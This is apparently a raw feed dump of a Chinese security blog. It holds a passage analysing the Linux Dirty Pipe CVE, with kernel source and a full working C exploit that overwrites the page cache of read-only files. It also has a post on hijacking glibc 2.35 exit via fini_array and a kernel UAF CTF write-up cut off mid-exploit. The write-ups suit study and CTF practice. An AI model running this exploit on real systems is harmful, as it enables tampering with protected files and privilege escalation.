class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment"> * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment"> * it, either the reader will consume it or it&#x27;ll still</span></span><br><span class="line"><span class="comment"> * be there for the next write.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -ERESTARTSYS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We&#x27;re going to release the pipe lock and wait for more</span></span><br><span class="line"><span class="comment"> * space. We wake up any readers if necessary, and then</span></span><br><span class="line"><span class="comment"> * after waiting we need to re-check whether the pipe</span></span><br><span class="line"><span class="comment"> * become empty while we dropped the lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">&#125;</span><br><span class="line">wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在上半部分的会验证待输入的内容和当前页内已输入的内容长度是否超过<code>PAGE_SIZE</code>，然后验证<code>buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE</code>如果通过则会进行copy操作。</p><p>如果未通过上半部分的验证则不会进入out，则会进入下方的for循环内，下面会新生成一个page，并且初始化buf</p><p><strong>注意：这里默认的<code>buf-&gt;flag = PIPE_BUF_FLAG_CAN_MERGE</code></strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="linux-内核page-cache机制"><a href="#linux-内核page-cache机制" class="headerlink" title="linux 内核page cache机制"></a>linux 内核page cache机制</h3><p>linux 通过将打开的文件放到缓存页之中，缓存页被使用过后也会保存一段时间避免不必要的IO操作。短时间内访问同一个文件，都会操作相同的文件缓存页，而不是反复打开。而我们通过该方法篡改了这个文件缓存页，则短时间内访问(读取)该文件的操作都会读到被我们篡改的文件缓存页上，完成利用。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><code>splice</code> 的零拷贝方法就是，直接用文件缓存页来替换<code>pipe</code> 中的缓存页(更改pipe缓存页指针指向文件缓存页)</p><p>这里漏洞出现在:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sanity(i))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里在最后是将page直接赋值给了buf，并且未初始化flag。如果我们修改page为目标文件，并且没有修改flag，那么我们可以直接使用pipe_write进行写。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/641.jpeg"                                     ></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先生成管道，并使用write填满所有管道 (下面截图中第一个结构体为<code>pipe_inode_info</code>)</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122202208115.png"                      alt="image-20221122202208115"                ></p><ol start="2"><li>随后read出所有pipe，head和tail相等，清空pipe</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122203439231.png"                      alt="image-20221122203439231"                ></p><ol start="3"><li>通过splice修改pipe-&gt;bufs-&gt;page指向文件缓存页</li><li>最后通过pipe_write写入内容</li></ol><h3 id="综上，得出exp"><a href="#综上，得出exp" class="headerlink" title="综上，得出exp"></a>综上，得出exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> data[] = <span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> data_size = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(p))</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(p[<span class="number">1</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(p[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] splice failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] short splice!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] write failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] short write!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122203918963.png"                      alt="image-20221122203918963"                ></p><hr><p>总的来说，这个CVE的利用不算是很难，后续我会将复现环境都打包到github上</p><p>参考链接:</p><p><a class="link"   href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg" >https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://dirtypipe.cm4all.com/" >https://dirtypipe.cm4all.com/<i class="fas fa-external-link-alt"></i></a></p><p>打包链接:</p><p><a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;持续性摆烂一段时间了，又想看jyy的课，又要期末考试了，好烦！索性花点时间把Gyan神上半年叫我复现的CVE复现了。&lt;/p&gt;
&lt;p&gt;这个CV</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="零拷贝" scheme="https://cv196082.gitee.io/tags/%E9%9B%B6%E6%8B%B7%E8%B4%9D/"/>
    
    <category term="pipe" scheme="https://cv196082.gitee.io/tags/pipe/"/>
    
  </entry>
  
  <entry>
    <title>GLIBC 2.35 hook</title>
    <link href="https://cv196082.gitee.io/2022/11/04/GLIBC2-35-hook/"/>
    <id>https://cv196082.gitee.io/2022/11/04/GLIBC2-35-hook/</id>
    <published>2022-11-04T11:13:08.000Z</published>
    <updated>2022-11-04T11:22:49.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>众所周知在高版本的glibc中取消了free_hook和malloc_hook都被删除掉了。</p><p>那么如果我们存在一个UAF漏洞但是只能申请size为0x20的chunk时就会显得十分窘迫，如果使用选择使用house of emma或者house of apple之类的攻击手法我们就需要花费大量的chunk来进行利用。</p><p>根据上述情况来说就目前我们已学的知识中可以使用exit_hook进行解决，不过就在今天在微信公众号中刷到一篇文章中提到了一篇文章，通过修改<code>_rtld_global._dl_ns._ns_loaded</code>实现劫持程序执行流。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/loader.png"                      alt="image-loader"                ></p><p>如上图所示，在通过exit函数或者程序正常退出时会调用fini_array中的函数</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221104180544894.png"                      alt="image-20221104180544894"                ></p><p>再从这张图中可以看到fini_array中的函数也正是<a href="https://cv196082.gitee.io/2022/03/07/house-of-banana/">house of banana</a>中提到的<code>_dl_fini</code>函数中调用的，并且可以看到是在</p><p><code>_rtld_global._dl_ns._ns_loaded</code>这个位置取出程序基地址，随后根据右边的偏移确定fini_array的位置，所以我们可以通过修改上述地址的内容到我们期望的位置即可劫持了。</p><hr><p>参考文章：<a class="link"   href="https://www.freebuf.com/articles/system/345968.html" >https://www.freebuf.com/articles/system/345968.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;众所周知在高版本的glibc中取消了free_hook和malloc_hook都被删除掉了。&lt;/p&gt;
&lt;p&gt;那么如果我们存在一个UAF漏洞但</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="堆利用" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    <category term="hook" scheme="https://cv196082.gitee.io/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>practice Ⅱ</title>
    <link href="https://cv196082.gitee.io/2022/10/19/practice2/"/>
    <id>https://cv196082.gitee.io/2022/10/19/practice2/</id>
    <published>2022-10-19T06:35:58.000Z</published>
    <updated>2022-10-19T06:36:00.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kernel-pwn1"><a href="#Kernel-pwn1" class="headerlink" title="Kernel pwn1"></a>Kernel pwn1</h2><p>题目非常简单，就是一道非常普通的内核堆题，不过由于思想有点活跃导致开始一直在往复杂的想去了</p><p><strong>吐槽一下：为什么cpio格式的要用img结尾我挂载了很久挂载不上，知道file一看发现是cpio格式</strong></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">test1_open</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(inode *, file *))_fentry__)(inode, filp);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x20</span>LL);</span><br><span class="line">  length = <span class="number">0x20</span>;</span><br><span class="line">  test1_buffer = v2;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  used = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">test1_release</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( test1_buffer )</span><br><span class="line">    kfree(test1_buffer, filp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的漏洞点出在这个UAF上面（开始我还一直在找堆溢出）。因为没注意到在启动脚本中是没有开启kaslr的所以我在用<code>tty_struct</code>，<code>sk_buff</code>这些东西来泄漏基地址，然后泄漏栈地址完成栈迁移。但是发现这些结构体的文件都无法打开，然后仔细一看启动脚本发现并没有开启地址随机化，所以直接开搞就行。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里只需要<code>seq_operations</code>结构体即可，<a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldt利用</a> 这篇文章中提到过这个结构体的使用，可以去看一下这里就不再赘述了。</p><p>题目比较简单直接放exp了</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 